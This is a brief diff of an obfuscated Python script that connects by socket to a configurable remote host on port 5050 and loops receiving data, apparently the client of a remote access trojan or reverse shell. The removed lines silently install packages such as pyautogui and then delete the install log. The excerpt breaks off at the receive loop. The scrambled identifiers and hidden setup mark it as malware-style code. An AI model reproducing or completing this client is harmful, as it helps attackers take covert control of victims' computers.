@@ -1,23 +1,9 @@
 import sys , os ,time
-try:
-    import pyautogui
-    import tqdm
-except:
-    os.system("pip install subprocess > install.txt")
-    os.system("pip install pyautogui > install.txt")
-    os.system("pip install tqdm > install.txt")
-    os.system("rm install.txt")
-    import subprocess
-    import pyautogui
-    import tqdm
 import socket
 bASYUAusU = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 PLppsokPSO = ""
 OIWODFISO = 5050
-PPJAjpA = "<SEPARATOR>"
-
 bASYUAusU.connect((PLppsokPSO ,OIWODFISO))
-
 def yyyyyyyyyyYyySSAASKJAKSAS():
     while True:
         OASASASONon = bASYUAusU.recv(1024)
